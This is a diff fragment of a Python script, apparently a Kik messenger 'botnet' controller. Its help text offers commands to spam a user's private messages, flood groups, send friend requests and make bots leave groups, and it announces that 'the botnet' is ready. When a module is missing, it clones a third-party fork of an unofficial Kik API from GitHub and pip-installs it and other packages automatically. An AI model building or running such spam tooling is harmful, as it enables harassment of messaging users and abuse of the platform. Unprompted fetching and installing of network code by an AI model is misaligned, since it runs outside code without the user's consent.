+    print(bcolors.OKBLUE + emoji.emojize("\n:black_small_square: \"Spam [JID or Username] w/ [Message]\" - Used to spam a user's PMs.\n:black_small_square: \"Poke [JID or username] w/ [Message]\" - Used for forwarding a single message to a user.\n:black_small_square: \"Friend\" - Used to add the bot as a friend so that you can add it to groups.\n:black_small_square: \"SendFriend [JID or Username]\" - Used to send a friend attribution request to a user.\n:black_small_square: \"GroupSpam [Message]\" - Used to spam the group that this command is used in.\n:black_small_square: \"Leave [GJID]\" - Used for making your bot(s) leave groups.\n") + bcolors.ENDC) #This explains the commands to the user
+    print(bcolors.OKBLUE + emoji.emojize("\n:warning: You can now use the botnet.\n") + bcolors.ENDC) #This lets the user know the botnet is ready
+    clear = open("loginretry.txt", "w+") #This clears the Loginretry.txt file
+    clear.close() #This closes the file, always a good practice.
+
+    while spam == "Qm90IG1hZGUgYnkgU3RldGhvU2F5c0hlbGxv": #This keeps the bot idle. (spam is just the variable that happens to be convenient for a while loop)
+        in_console_message = input("") #This checks if the user has typed anything into the console
+        if in_console_message.lower() == "ping": #If they type ping, it will say pong pack.
+            print(bcolors.OKBLUE + emoji.emojize("\npong.\n") + bcolors.ENDC)
+        else: #If they do not type ping, it reminds them that commands must be sent to the kik bots.
+            print(bcolors.FAIL + emoji.emojize("\n:warning: You can't use commands directly in the console! You need to message your bots on Kik.") + bcolors.ENDC)
+except ModuleNotFoundError: #This is triggered when the script fails to run because dependencies are not installed.
+    print("Oh, it looks like some things need to be set up real quick! I'll take care of that for you.\n") #This lets the user know the script is going to install dependencies
+    time.sleep(1) #Waits a second so the user can read
+    print("Please wait...\n")
+    time.sleep(1) #Waits another second so the user can read
+    os.system('git clone -b new https://github.com/StethoSaysHello/kik-bot-api-unofficial') #This installs the stuff from stetho's fork of Tomer8007. Just has some redundant stuff quoted out.
+    os.system('pip3 install ./kik-bot-api-unofficial')
+
+    def install(package): #This is a function to make the installs a little more efficient. I could have just used os.system again, but...
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+    install('emoji') #This is used to send/recieve, and encode/decode emojis.
+    install('colorama') #This is used to display colored text in the terminal.
+    install('kik_unofficial') #This is pretty obvious.
+    print(bcolors.OKBLUE + ("\nI'm done installing everything you need!\nThe program will now stop, please run this script again when you're ready.") + bcolors.ENDC) #This lets the user know to restart
+    exit() #This stops the program
